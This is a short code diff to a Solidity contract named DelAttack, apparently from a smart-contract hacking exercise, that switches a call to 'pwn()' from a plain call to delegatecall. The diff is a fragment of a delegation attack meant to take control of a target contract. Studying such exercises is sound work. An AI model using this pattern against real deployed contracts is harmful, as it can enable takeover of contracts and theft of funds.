@@ -43,7 +43,7 @@ contract DelAttack {
     bytes4 public sel = bytes4(abi.encodeWithSignature("pwn()"));
 
     function attack() external {
-        (bool succ, ) = address(x).call(abi.encodeWithSignature("pwn()"));
+        (bool succ, ) = address(x).delegatecall(abi.encodeWithSignature("pwn()"));
         require(succ, "Call failed");
     }
 }
